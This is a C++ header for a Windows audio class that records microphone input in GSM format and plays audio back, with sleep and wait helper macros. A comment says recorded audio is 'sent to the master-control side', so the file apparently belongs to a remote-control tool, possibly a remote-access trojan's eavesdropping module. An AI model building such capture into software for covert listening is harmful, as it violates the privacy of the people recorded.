#pragma once
#include <MMSYSTEM.H>
#include <MMReg.h>
#include <assert.h>
#pragma comment(lib, "Winmm.lib")
// 高精度的睡眠函数
#define Sleep_m(ms) { timeBeginPeriod(1); Sleep(ms); timeEndPeriod(1); }

// 以步长n毫秒在条件C下等待T秒(n是步长，必须能整除1000)
#define WAIT_n(C, T, n) {assert(!(1000%(n)));int s=(1000*(T))/(n);do{Sleep(n);}while((C)&&(--s));}

// 在条件C成立时等待T秒(步长10ms)
#define WAIT(C, T) { timeBeginPeriod(1); WAIT_n(C, T, 10); timeEndPeriod(1); }

// 在条件C成立时等待T秒(步长1ms)
#define WAIT_1(C, T) { timeBeginPeriod(1); WAIT_n(C, T, 1); timeEndPeriod(1); }

class CAudio
{
public:
	CAudio();
	virtual ~CAudio();
	GSM610WAVEFORMAT m_GSMWavefmt;
	ULONG     m_ulBufferLength;
	LPWAVEHDR m_InAudioHeader[2];   //两个头
	LPBYTE    m_InAudioData[2];     //两个数据   保持声音的连续
	HANDLE	  m_hEventWaveIn;
	HANDLE	  m_hStartRecord;    //两个事件
	HWAVEIN   m_hWaveIn;         //设备句柄	
	DWORD     m_nWaveInIndex;
	bool    m_hThreadCallBack;
	static DWORD WINAPI waveInCallBack(LPVOID lParam);   //发送到主控端
	LPBYTE GetRecordBuffer(LPDWORD dwBufferSize);
	BOOL InitializeWaveIn();
	BOOL m_bIsWaveInUsed;

	HWAVEOUT m_hWaveOut;
	BOOL	m_bExit;
	BOOL     m_bIsWaveOutUsed;
	DWORD    m_nWaveOutIndex;
	LPWAVEHDR m_OutAudioHeader[2];   //两个头
	LPBYTE    m_OutAudioData[2];     //两个数据   保持声音的连续
	BOOL PlayBuffer(LPBYTE szBuffer, DWORD dwBufferSize);
	BOOL InitializeWaveOut();
};
